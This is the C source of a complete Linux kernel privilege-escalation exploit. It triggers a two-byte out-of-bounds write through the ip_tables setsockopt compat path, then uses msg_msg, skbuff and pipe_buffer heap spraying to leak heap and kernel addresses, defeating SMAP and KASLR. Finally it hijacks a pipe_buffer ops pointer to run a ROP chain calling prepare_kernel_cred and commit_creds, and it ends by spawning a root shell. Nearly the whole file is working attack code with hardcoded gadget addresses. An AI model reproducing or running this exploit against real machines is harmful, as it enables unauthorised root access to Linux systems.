#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <linux/netfilter_ipv4/ip_tables.h>

#define PAGE_SIZE 0x1000
#define PRIMARY_SIZE 0x1000
#define SECONDARY_SIZE 0x400

#define NUM_SOCKETS 4
#define NUM_SKBUFFS 128
#define NUM_PIPEFDS 256
#define NUM_MSQIDS 4096

#define HOLE_STEP 1024

#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42
#define MTYPE_FAKE 0x1337

#define MSG_TAG 0xAAAAAAAA

#define SKB_SHARED_INFO_SIZE 0x140
#define MSG_MSG_SIZE (sizeof(struct msg_msg))
#define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))

#define ANON_PIPE_BUF_OPS 0x123e100

struct msg_msg
{
    uint64_t m_list_next;
    uint64_t m_list_prev;
    uint64_t m_type;
    uint64_t m_ts;
    uint64_t next;
    uint64_t security;
};

struct pipe_buffer
{
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private;
};

struct pipe_buf_operations
{
    uint64_t confirm;
    uint64_t release;
    uint64_t steal;
    uint64_t get;
};

struct msg_msgseg
{
    uint64_t next;
};

struct
{
    long mtype;
    char mtext[PRIMARY_SIZE - MSG_MSG_SIZE];
} msg_primary;

struct
{
    long mtype;
    char mtext[SECONDARY_SIZE - MSG_MSG_SIZE];
} msg_secondary;
struct
{
    long mtype;
    char mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];
} msg_fake;

int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp)
{
    *(long *)msgp = msgtyp;
    if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) < 0)
    {
        perror("[-] msgsnd");
        return -1;
    }
    return 0;
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) < 0)
    {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}

int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT) <
        0)
    {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}

int setup_sandbox(void)
{
    if (unshare(CLONE_NEWUSER) < 0)
    {
        perror("[-] unshare(CLONE_NEWUSER)");
        return -1;
    }
    if (unshare(CLONE_NEWNET) < 0)
    {
        perror("[-] unshare(CLONE_NEWNET)");
        return -1;
    }

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) < 0)
    {
        perror("[-] sched_setaffinity");
        return -1;
    }

    return 0;
}

int free_skbuff(int ss[NUM_SOCKETS][2], void *buf, size_t size)
{
    for (int i = 0; i < NUM_SOCKETS; i++)
    {
        for (int j = 0; j < NUM_SKBUFFS; j++)
        {
            if (read(ss[i][1], buf, size) < 0)
            {
                perror("[-] read");
                return -1;
            }
        }
    }
    return 0;
}

int trigger_oob_write(int s)
{
    struct __attribute__((__packed__))
    {
        struct ipt_replace replace;
        struct ipt_entry entry;
        struct xt_entry_match match;
        char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];
        struct xt_entry_target target;
    } data = {0};

    data.replace.num_counters = 1;
    data.replace.num_entries = 1;
    data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
                         sizeof(data.pad) + sizeof(data.target));

    data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +
                              sizeof(data.pad) + sizeof(data.target));
    data.entry.target_offset =
        (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));

    data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));
    strcpy(data.match.u.user.name, "icmp");
    data.match.u.user.revision = 0;

    data.target.u.user.target_size = sizeof(data.target);
    strcpy(data.target.u.user.name, "NFQUEUE");
    data.target.u.user.revision = 1;

    // Partially overwrite the adjacent buffer with 2 bytes of zero.
    if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0)
    {
        if (errno == ENOPROTOOPT)
        {
            printf("[-] Error ip_tables module is not loaded.\n");
            return -1;
        }
    }

    return 0;
}

void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_ts, uint64_t next)
{
    msg->m_list_next = m_list_next;
    msg->m_list_prev = m_list_prev;
    msg->m_type = MTYPE_FAKE;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = 0;
}
int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size)
{
    for (int i = 0; i < NUM_SOCKETS; i++)
    {
        for (int j = 0; j < NUM_SKBUFFS; j++)
        {
            if (write(ss[i][0], buf, size) < 0)
            {
                perror("[-] write");
                return -1;
            }
        }
    }
    return 0;
}

void build_krop(u_int64_t *buffer, u_int64_t scratchpad_addr)
{

    // add rsp, 0xd0 ; ret
    buffer[0] = 0xffffffff8106f8b9;
    buffer = &buffer[0xd0 / 8];
    int i = 1;

    // save rbp @ scratchpad_addr
    // push rbp; mov rbp, rsp ; pop rbx ; pop r12 ; pop rbp ; ret
    buffer[i++] = 0xffffffff810ea98d;
    buffer[i++] = scratchpad_addr; // r12
    buffer[i++] = 0xDEADBEEF;      // rbp
    // mov qword ptr [r12], rbx ; pop rbx ; pop r12 ; pop rbp ; ret
    buffer[i++] = 0xffffffff81088273;
    buffer[i++] = 0xDEADBEEF;
    buffer[i++] = 0xDEADBEEF;
    buffer[i++] = 0xDEADBEEF;

    // pop rdi ; ret
    buffer[i++] = 0xffffffff8104077d;
    buffer[i++] = 0;
    // prepare_kernel_cred
    buffer[i++] = 0xffffffff810ca410;
    // xchg rdi, rax ; mov bh, bh ; movzx eax, al ; pop rbp ; ret
    buffer[i++] = 0xffffffff81812112;
    buffer[i++] = (u_int64_t)buffer;
    // commit_creds
    buffer[i++] = 0xffffffff810c9f30;

    // pop rbp ; ret
    buffer[i++] = 0xffffffff810006a7;
    buffer[i++] = scratchpad_addr - 0xa;
    // push qword ptr [rbp + 0xa] ; pop rbp ; ret
    buffer[i++] = 0xffffffff816f4e6f;
    // leave ; ret
    buffer[i++] = 0xffffffff8100304f;
}

int main(int argc, char const *argv[])
{

    int s;
    int msqid[NUM_MSQIDS];
    int ss[NUM_SOCKETS][2];
    int pipefd[NUM_PIPEFDS][2];

    char primary_buf[PRIMARY_SIZE - SKB_SHARED_INFO_SIZE];
    char secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];

    int fake_idx = -1;
    int real_idx = -1;
    uint64_t kheap_addr = 0;
    uint64_t kbase_addr = 0;

    struct pipe_buf_operations *ops;
    struct pipe_buffer *buf;

    uint64_t pipe_buffer_ops = 0;

    if (setup_sandbox() < 0)
        goto error;

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("[-] socket");
        goto error;
    }
    for (int i = 0; i < NUM_SOCKETS; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0)
        {
            perror("[-] socketpair");
            goto error;
        }
    }
    for (int i = 0; i < NUM_MSQIDS; i++)
    {
        msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (msqid[i] < 0)
        {
            perror("[-] msgget");
            goto error;
        }
    }

    /* Step.1 Spray Primary Message  */
    printf("[+] STAGE 1: Memory corruption...\n");

    printf("[*] spray message...\n");
    for (int i = 0; i < NUM_MSQIDS; i++)
    {
        bzero(&msg_primary, 0);
        *(int *)&msg_primary.mtext[0] = MSG_TAG;
        *(int *)&msg_primary.mtext[4] = i;
        if (write_msg(msqid[i], &msg_primary, sizeof(msg_primary),
                      MTYPE_PRIMARY) < 0)
            goto error;
    }

    for (int i = 0; i < NUM_MSQIDS; i++)
    {
        bzero(&msg_secondary, 0);
        *(int *)&msg_secondary.mtext[0] = MSG_TAG;
        *(int *)&msg_secondary.mtext[4] = i;
        if (write_msg(msqid[i], &msg_secondary, sizeof(msg_secondary),
                      MTYPE_SECONDARY) < 0)
            goto error;
    }

    printf("[*] create holes in primary messages...\n");
    for (int i = HOLE_STEP; i < NUM_MSQIDS; i += HOLE_STEP)
    {
        if (read_msg(msqid[i], &msg_primary, sizeof(msg_primary),
                     MTYPE_PRIMARY) < 0)
            goto error;
    }

    printf("[*] tigger overlap...\n");

    // tigger 2-bytes null overlap in xt_compat_target_from_user

    trigger_oob_write(s);

    printf("[*] searching for corrupted primary message...\n");

    for (int i = 0; i < NUM_MSQIDS; i++)
    {
        if (i != 0 && (i % HOLE_STEP) == 0)
            continue;
        if (peek_msg(msqid[i], &msg_secondary, sizeof(msg_secondary), 1) < 0)
            goto error;
        if (*(int *)&msg_secondary.mtext[0] != MSG_TAG)
        {
            printf("[-] Error could not corrupt any primary message.\n");
            goto error;
        }
        if (*(int *)&msg_secondary.mtext[4] != i)
        {
            fake_idx = i;
            real_idx = *(int *)&msg_secondary.mtext[4];
            break;
        }
    }

    assert(fake_idx != -1 && real_idx != -1);

    // P[fake_idx], P[real_idx] -> S[real_idx]
    printf("[*] fake_idx : %x\n", fake_idx);
    printf("[*] real_idx : %x\n", real_idx);
    printf("\n");

    printf("[+] STAGE 2: SMAP bypass\n");

    printf("[*] free real secondary message...\n");
    if (read_msg(msqid[real_idx], &msg_secondary, sizeof(msg_secondary),
                 MTYPE_SECONDARY) < 0)
        goto error;

    printf("[*] spray fake secondary messages...\n");
    bzero(secondary_buf, sizeof(secondary_buf));
    build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
                  PAGE_SIZE - MSG_MSG_SIZE, 0);
    if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    {
        perror("[-] spray_skbuff");
        goto error;
    }
    printf("[*] Leaking adjacent secondary message...\n");
    if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)
        goto error;
    // Check if the leak is valid.
    if (*(int *)&msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG)
    {
        printf("[-] Error could not leak adjacent secondary message.\n");
        goto error;
    }

    // sec_msg.prev points to primary msg
    struct msg_msg *msg;
    msg = (struct msg_msg *)&msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];
    printf("msg->m_list_next = %llx\n", msg->m_list_next);
    printf("msg->m_list_prev = %llx\n", msg->m_list_prev);
    kheap_addr = msg->m_list_next;
    if (kheap_addr & (PRIMARY_SIZE - 1))
        kheap_addr = msg->m_list_prev;

    // free and re-spray secondary msg
    printf("[*] freeing fake secondary message...\n");
    free_skbuff(ss, secondary_buf, sizeof(secondary_buf));
    bzero(secondary_buf, sizeof(secondary_buf));
    build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
                  sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);
    if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    {
        perror("[-] spray_skbuff");
        goto error;
    }
    printf("[*] Leaking primary message...\n");
    if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)
        goto error;

    // Check if the leak is valid.
    if (*(int *)&msg_fake.mtext[PAGE_SIZE] != MSG_TAG)
    {
        printf("[-] Error could not leak adjacent secondary message.\n");
        goto error;
    }
    // The primary message contains a pointer to the secondary message.
    msg = (struct msg_msg *)&msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];
    kheap_addr = msg->m_list_next;
    if (kheap_addr & (SECONDARY_SIZE - 1))
        kheap_addr = msg->m_list_prev;

    // Calculate the address of the fake secondary message.
    kheap_addr -= SECONDARY_SIZE;
    printf("[*] kheap_addr: %llx\n", kheap_addr);
    printf("\n");
    printf("[+] STAGE 3: KASLR bypass\n");

    printf("[*] freeing fake secondary messages...\n");
    printf("[*] spraying fake secondary messages...\n");
    free_skbuff(ss, secondary_buf, sizeof(secondary_buf));
    bzero(secondary_buf, sizeof(secondary_buf));
    build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr,
                  0, 0);
    if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    {
        perror("[-] spray_skbuff");
        goto error;
    }
    pause();

    printf("[*] free fake secondary messagen");
    if (read_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), MTYPE_FAKE) < 0)
        goto error;

    printf("[*] Spraying pipe_buffer objects...\n");
    for (int i = 0; i < NUM_PIPEFDS; i++)
    {
        if (pipe(pipefd[i]) < 0)
        {
            perror("[-] pipe");
            goto error;
        }
        // Write something to populate pipe_buffer.
        if (write(pipefd[i][1], "pwn", 3) < 0)
        {
            perror("[-] write");
            goto error;
        }
    }

    printf("[*] Leaking and freeing pipe_buffer object...\n");
    for (int i = 0; i < NUM_SOCKETS; i++)
    {
        for (int j = 0; j < NUM_SKBUFFS; j++)
        {
            if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) < 0)
            {
                perror("[-] read");
                goto error;
            }
            if (*(uint64_t *)&secondary_buf[0x10] != MTYPE_FAKE)
                pipe_buffer_ops = *(uint64_t *)&secondary_buf[0x10];
        }
    }

    kbase_addr = pipe_buffer_ops - ANON_PIPE_BUF_OPS;
    printf("[*] anon_pipe_buf_ops: %llx \n", pipe_buffer_ops);
    printf("[*] kbase_addr: %llx \n", kbase_addr);

    printf("\n");
    printf("[+] STAGE 4: Kernel code execution\n");
    memset(secondary_buf, 0, sizeof(secondary_buf));
    buf = (struct pipe_buffer *)&secondary_buf;
    buf->ops = kheap_addr + 0x290;
    ops = (struct pipe_buf_operations *)&secondary_buf[0x290];

    // pop rsp; ret
    *(u_int64_t *)&secondary_buf[0x39] = 0xffffffff81163e70;
    // push rsi ; jmp qword ptr [rsi + 0x39]
    ops->release = 0xffffffff8173778c;

    build_krop((void *)secondary_buf, (u_int64_t)kheap_addr + 0x2b0);
    if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
        goto error;

    // Trigger pipe_release().
    printf("[*] Releasing pipe_buffer objects...\n");
    for (int i = 0; i < NUM_PIPEFDS; i++)
    {
        if (close(pipefd[i][0]) < 0)
        {
            perror("[-] close");
            goto error;
        }
        if (close(pipefd[i][1]) < 0)
        {
            perror("[-] close");
            goto error;
        }
    }

    system("/bin/sh");
error:
    return 1;
}
